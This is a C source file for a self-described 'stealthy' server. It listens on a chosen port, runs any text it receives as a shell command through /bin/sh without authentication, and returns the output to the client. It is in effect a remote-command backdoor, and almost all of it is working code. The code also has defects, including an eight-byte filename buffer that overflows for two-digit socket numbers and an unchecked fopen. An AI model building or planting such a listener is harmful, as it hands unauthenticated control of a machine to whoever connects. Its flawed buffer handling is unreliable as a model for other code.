/*
 * server.c -- a stealthy server that executes commands sent to it
 */
#include "include.h"

void *respond_client(void *param);
int fork_and_execute(char *command, int sockfd);

int keep_running = 1;

int main(int argc, char** argv)
{
    int port, sockfd, new_sockfd;
    struct sockaddr_in host_addr, client_addr;
    socklen_t sin_size;
    int yes = 1;

    if (argc != 2) {
        fprintf(stderr, "USAGE: %s <port>\n", argv[0]);
        return EXIT_FAILURE;
    }

    int length = strlen(argv[1]);
    for (int i = 0; i < length; i++) {
        if (!isdigit(argv[1][i])) {
            fprintf(stderr, "Expected port, got: %s\n", argv[1]);
            return EXIT_FAILURE;
        }
    }

    port = atoi(argv[1]);
    if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
        fprintf(stderr, "Fatal error in socket\n");
        PRINT_ERRNO;
        return EXIT_FAILURE;
    }

    if ((setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int))) == -1) {
        fprintf(stderr, "Failed to set socket option SO_REUSEADDR\n");
        PRINT_ERRNO;
        return EXIT_FAILURE;
    }

    host_addr.sin_family = AF_INET;
    host_addr.sin_port = htons(port);
    // Automatically use my IP
    host_addr.sin_addr.s_addr = 0;
    memset(&(host_addr.sin_zero), '\0', 8);

    if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1) {
        fprintf(stderr, "Failed to bind to socket\n");
        PRINT_ERRNO;
        return EXIT_FAILURE;
    }

    if (listen(sockfd, BACKLOG_SIZE) == -1) {
        fprintf(stderr, "Failed to listen on socket\n");
        PRINT_ERRNO;
        return EXIT_FAILURE;
    }

    while(keep_running) {
        pthread_t tid;
        pthread_attr_t attr;
        struct thread_msg *params;

        sin_size = sizeof(struct sockaddr_in);
        new_sockfd = accept(sockfd, (struct sockaddr *) &client_addr, &sin_size);
        if (new_sockfd == -1) {
            fprintf(stderr, "Failed to accept connection\n");
            PRINT_ERRNO;
            return EXIT_FAILURE;
        }
        DEBUG_PRINT("Accepted connection from %s on socket %d\n",
                inet_ntoa(client_addr.sin_addr), new_sockfd);
        pthread_attr_init(&attr);
        params = (struct thread_msg *)malloc(sizeof(struct thread_msg));
        params->sockfd = new_sockfd;
        pthread_create(&tid, &attr, respond_client, params);
    }

    return EXIT_SUCCESS;
}

void *respond_client(void *param)
{
    struct thread_msg *msg = (struct thread_msg *)param;
    int recv_length, sockfd = msg->sockfd;
    long loop = 1;
    char buffer[BUFFER_SIZE];

    while(loop && keep_running) {
        recv_length = recv(sockfd, &buffer, BUFFER_SIZE, 0);

        if (recv_length == -1) {
            fprintf(stderr, "Got an error when trying to recieve message\n");
            PRINT_ERRNO;
            close(sockfd);
            return 0;
        } else if (recv_length > 0) {
            if (recv_length < BUFFER_SIZE)
            {
                buffer[recv_length] = 0;
            }
            DEBUG_PRINT("Recieved message of length %i. Message content: %s\n",
                    recv_length, buffer);

            if (strncmp(buffer, DISCONNECT_MSG, strlen(DISCONNECT_MSG)) == 0) {
                loop = 0;
            } else if (strncmp(buffer, SHUTDOWN_MSG, strlen(SHUTDOWN_MSG)) == 0) {
                DEBUG_PRINT("Shutdown recieved\n");
                keep_running = 0;
                DEBUG_PRINT("Disconnecting socket: %d\n", sockfd);
                free(msg);
                close(sockfd);
                sleep(1);
                exit(EXIT_SUCCESS);
            } else if (fork_and_execute(buffer, sockfd) == -1) {
                fprintf(stderr, "Failed to execute command\n");
            }
        }
    }

    DEBUG_PRINT("Disconnecting socket: %d\n", sockfd);
    free(msg);
    close(sockfd);
    return 0;
}

int fork_and_execute(char *command, int sockfd)
{
    pid_t pid;
    char *formatted_command, file[8], *dump;
    int wstatus;
    long out_len;
    FILE *out;
    sprintf(file, "%doutput", sockfd);
    formatted_command = (char*)malloc(strlen(command) + strlen(file) + 4);
    sprintf(formatted_command, "%s > %s", command, file);
    DEBUG_PRINT("%s\n", formatted_command);

    pid = fork();
    if (pid < 0) {
        fprintf(stderr, "Fork failed\n");
        return -1;
    } else if (pid == 0) {
        return execlp("/bin/sh", "sh", "-c", formatted_command, NULL);
    } else {
        waitpid(pid, &wstatus, 0);
        DEBUG_PRINT("File \"%s\" made ", file);

        out = fopen(file, "rb");
        fseek(out, 0, SEEK_END);
        out_len = ftell(out);
        fseek(out, 0, SEEK_SET);
        dump = (char*)malloc(out_len + 1);
        fread(dump, out_len, 1, out);
        DEBUG_PRINT("... read ");

        fclose(out);
        dump[out_len] = 0;
        unlink(file);
        DEBUG_PRINT("... deleted ");

        send(sockfd, dump, out_len + 1, 0);
        DEBUG_PRINT("... sent\n");

        free(formatted_command);
        return 0;
    }
}
